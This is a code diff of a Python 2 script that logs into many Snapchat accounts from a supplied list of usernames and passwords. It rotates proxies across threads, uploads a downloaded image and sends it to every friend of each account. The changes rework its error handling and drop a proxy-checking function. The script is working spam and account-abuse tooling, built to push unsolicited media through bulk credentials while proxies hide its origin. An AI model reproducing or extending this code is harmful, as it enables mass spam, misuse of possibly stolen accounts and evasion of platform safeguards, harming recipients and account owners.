@@ -8,8 +8,10 @@ imagename = ""
 threads = 1
 
 def main():
-    t = datetime.now()
+    global threads, inputData, inputProxies
     # check everything first
+    t = datetime.now()
+    print t  #!!!
     sts = checkStates() 
     if sts == 0:
         print "Fatal error. Contact me on skype 'volkvid'"
@@ -17,14 +19,14 @@ def main():
             zxc = raw_input()
         except EOFError:
             pass
-        sys.exit(0) #sys.exit(0)
-    elif sts == 1:
+        sys.exit(0) 
+    elif sts == 1: 
         f = open("output.txt", "w")
         f.close()
         prepair()
-        print "threads =", threads
+        #print "threads =", threads #22:36:23, 
         if threads == 1:
-            oneThread(inputData)
+            oneThread(inputData, inputProxies)
         else:
             leni = len(inputData)
             if threads > leni:
@@ -34,45 +36,69 @@ def main():
             thr = []
             for i in range(threads):
                 data = authdata[i]
-                thread = threading.Thread(target=oneThread, args=(data, ))
+                prx = inputProxies
+                
+                thread = threading.Thread(target=oneThread, args=(data, prx, ))
                 thread.start()
-                #thr.append(thread)
-                thread.join()
+                thr.append(thread)
+                #thread.join()
 
-            #for t in thr:
-                #t.join()
+            for t in thr:
+                t.join()
 
-            print "Run out of accounts"
+            print "\nRun out of accounts"
+            print "time =", str(datetime.now() - t)
 
 
-def oneThread(inp):
+def oneThread(inp, inpProxy):
     result = {}
-    for proxy in inputProxies:
-        #print "chg prx"
-        if not is_bad_proxy(proxy):
-            for auth in inp: #inputData:
-                s = auth["user"]+":"+auth["pass"]
-                #print "1a"
-                if s not in result:
-                    num = process(proxy, auth)
-                    #print "2a", num
-                    fff = open("output.txt", "a")
-                    if num == "prox":
-                        break # bad proxy
-                    elif num == 0:
+    for proxy in inpProxy:
+        for auth in inp: 
+            s = auth["user"]+":"+auth["pass"]
+            if s not in result:
+                r = process(proxy, auth)
+                if r["st"] != 0:
+                    #any error
+                    if r["st"] == -100:
+                        result[s] = "#error, wrong pass"
+                        print s + " #error, wrong pass"
+                        fff = open("output.txt", "a")
+                        fff.write(s + " #error, wrong pass\n")
+                        fff.close()
+                    if r["st"] == -101:
+                        result[s] = "#error, no account"
+                        print s + " #error, no account"
+                        fff = open("output.txt", "a")
+                        fff.write(s + " #error, no account\n")
+                        fff.close()
+                    if r["st"] == 400:
+                        result[s] = "#error, may be no friends"
+                        print s + " error, may be no friends"
+                        fff = open("output.txt", "a")
+                        fff.write(s + " error, may be no friends\n")
+                        fff.close()
+                    if r["st"] == 408:
+                        result[s] = "#error, req timeout"
+                        print s + " error, req timeout"
+                        fff = open("output.txt", "a")
+                        fff.write(s + " error, req timeout\n")
+                        fff.close()
+                    if r["st"] == 403:
+                        break #its ok. test on all accs and delete debug outp
+                else:
+                    #no errors 
+                    if r["num"] == 0:
                         result[s] = "#error"
                         print s + " #error"
+                        fff = open("output.txt", "a")
                         fff.write(s + " #error\n")
+                        fff.close()
                     else:
-                        result[s] = "#" + str(num)
-                        print s + " #" + str(num)
-                        fff.write(s + " #" + str(num) + "\n")
-                    fff.close()
-
-        if len(inp) == len(result):
-            #print "Ran out of accounts" # ! fix 
-            break
-
+                        result[s] = "#" + str(r["num"])
+                        print s + " #" + str(r["num"])
+                        fff = open("output.txt", "a")
+                        fff.write(s + " #" + str(r["num"]) + "\n")
+                        fff.close()
     if len(inp) != len(result):
         print "Ran out of proxies"
 
@@ -80,49 +106,55 @@ def oneThread(inp):
 # start new thread with a pack of users, for ex: 100 users -> 5 threads with 20 users
 def process(prox, auth):
     prox = {"https": "https://"+prox}
-
+    ret = {"st": 403, "num": 0}
     try:
         s = Snapchat()
         s.proxies = prox
         # measure "ping"
-        tt = datetime.now()
+        #tt = datetime.now()
         login = s.login(auth["user"], auth["pass"])
-        dt = (datetime.now()-tt).total_seconds()
+        #dt = (datetime.now()-tt).total_seconds()
+        # timeout 
+        #if dt >= 5.0:
+            #ret["st"] = 408
+            #return ret
+            
         try:
-            print "l.e", login['error']
+            status = login['status']
+            ret["st"] = status
+            #print "(st)"
+            return ret
         except:
-            print "no e"
-
-        try:
-            if login['status'] == 403 or login['status'] == 400 or dt > 3.0:
-                return "prox"
-        except:
-            #print "login ok", auth["user"], auth["pass"]
             pass
-        
+
         # upload pic for curr account
-        media_id = s.upload(imagename)
-        #print "media_id", media_id
+        try:
+            media_id = s.upload(imagename)
+        except Exception as ze:
+            #print "(upload)", str(ze)
+            pass
 
         recipients = ""
         for friend in login["friends"]:
             recipients += friend["name"] + ","
-        #print "\nrecipients:", recipients
         try:
+            #flag = "1"
             done = s.send(media_id, recipients, time = 10)
-            #print "(done)", done
             if done:
-                #num += 1
-                return len(login["friends"])
-            else:
-                return 0
-                
+                #print "(done), fr =", len(login["friends"])
+                ret["st"] = 0
+                ret["num"] = len(login["friends"])
+                return ret 
         except Exception as ex:
-            #print "(send) to names" , str(ex)
-            return 0
+            #flag = "0"
+            #print "(send)" , str(ex), "q f =", len(login["friends"])
+            ret["st"] = 403
+            return ret
+            
+        
     except Exception as ex:
-        #print "(main ex)", str(ex)
-        return 0
+        #print "(process)", str(ex)
+        return ret
 
 
 def prepair():
@@ -206,26 +238,6 @@ def prepair():
     imagename = "file." + form
     urllib.urlretrieve(image, filename=imagename)
     #print "image is downloaded"
-
-
-def is_bad_proxy(pip):
-    socket.setdefaulttimeout(6)
-    try:        
-        proxy_handler = urllib2.ProxyHandler({'https': pip})        
-        opener = urllib2.build_opener(proxy_handler)
-        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
-        #Snapchat/4.1.01 (Nexus 4; Android 18; gzip)')]
-        urllib2.install_opener(opener)        
-        req=urllib2.Request('https://www.google.com')
-        #https://feelinsonice.appspot.com/bq/') #
-        sock=urllib2.urlopen(req)
-    except urllib2.HTTPError, e:
-        #print "e1", str(e)
-        return True 
-    except Exception, detail:
-        #print "e2", str(detail)
-        return True
-    return False
 
 
 def checkStates():
